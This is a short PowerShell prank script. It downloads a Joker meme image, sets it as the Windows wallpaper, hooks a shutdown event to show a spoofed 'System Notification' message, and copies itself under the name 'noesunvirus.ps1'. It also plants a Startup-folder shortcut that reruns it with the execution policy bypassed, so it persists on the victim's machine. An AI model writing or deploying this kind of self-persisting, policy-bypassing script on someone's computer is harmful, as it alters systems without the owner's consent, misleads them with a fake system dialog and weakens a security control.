$imagePath = "$env:userprofile\Pictures\background.jpg"

$imageUrl = "https://i.kym-cdn.com/editorials/icons/mobile/000/009/963/evil_jonkler.jpg"

Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
[Wallpaper]::SystemParametersInfo(20, 0, $imagePath, 0x01)

function Show-ImageMessage {
    Add-Type -AssemblyName PresentationFramework
    [System.Windows.MessageBox]::Show("Why so serious?", "System Notification", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Information)
}

Register-WmiEvent -Query "SELECT * FROM Win32_ComputerShutdownEvent" -Action {
    Show-ImageMessage
}

$scriptPath = "$env:userprofile\Downloads\noesunvirus.ps1"

$startupShortcutPath = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\SetWallpaper.lnk"

if (-not (Test-Path $startupShortcutPath)) {
    $WshShell = New-Object -ComObject WScript.Shell
    $shortcut = $WshShell.CreateShortcut($startupShortcutPath)
    $shortcut.TargetPath = "powershell.exe"
    $shortcut.Arguments = "-ExecutionPolicy Bypass -File `"$scriptPath`""
    $shortcut.Save()

    Copy-Item $MyInvocation.MyCommand.Path $scriptPath
}
